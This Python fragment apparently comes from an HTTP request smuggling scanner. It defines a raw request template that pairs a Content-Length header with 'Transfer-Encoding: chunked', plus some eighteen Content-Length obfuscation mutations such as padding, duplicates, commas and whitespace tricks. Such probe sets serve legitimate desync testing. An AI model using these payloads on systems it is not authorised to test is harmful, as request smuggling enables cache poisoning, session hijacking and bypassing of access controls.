
def render_cl_template(cl_gadget, extra_header=None):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += cl_gadget + RN
	if extra_header:
		p.header += extra_header + RN
	p.header += "Transfer-Encoding: chunked" + RN
	return p

mutations["CL-plus"] = render_cl_template("Content-Length: +__REPLACE_CL__")
mutations["CL-minus"] = render_cl_template("Content-Length: -__REPLACE_CL__")
mutations["CL-pad"] = render_cl_template("Content-Length: 0__REPLACE_CL__")
mutations["CL-bigpad"] = render_cl_template("Content-Length: 00000000000__REPLACE_CL__")
mutations["CL-spacepad"] = render_cl_template("Content-Length: 0 __REPLACE_CL__")
mutations["CL-e"] = render_cl_template("Content-Length: __REPLACE_CL__e0")
mutations["CL-dec"] = render_cl_template("Content-Length: __REPLACE_CL__.0")
mutations["CL-commaprefix"] = render_cl_template("Content-Length: 0, __REPLACE_CL__")
mutations["CL-commasuffix"] = render_cl_template("Content-Length: __REPLACE_CL__, 0")
mutations["CL-expect"] = render_cl_template("Content-Length: __REPLACE_CL__", "Expect: 100-continue")
mutations["CL-expect-obfs"] = render_cl_template("Content-Length: __REPLACE_CL__", "Expect: x 100-continue")
mutations["CL-error"] = render_cl_template("X-Invalid Y:\r\nContent-Length: __REPLACE_CL__")
mutations["CL-dupe"] = render_cl_template("Content-Length: __REPLACE_CL__\r\nContent-Length: 0")
mutations["CL-dupe-rev"] = render_cl_template("Content-Length: 0\r\nContent-Length: __REPLACE_CL__")
mutations["CL-space-before"] = render_cl_template(" Content-Length: __REPLACE_CL__")
mutations["CL-tab-before"] = render_cl_template("\tContent-Length: __REPLACE_CL__")
mutations["CL-nospace"] = render_cl_template("Content-Length:__REPLACE_CL__")
mutations["CL-space-colon"] = render_cl_template("Content-Length : __REPLACE_CL__")
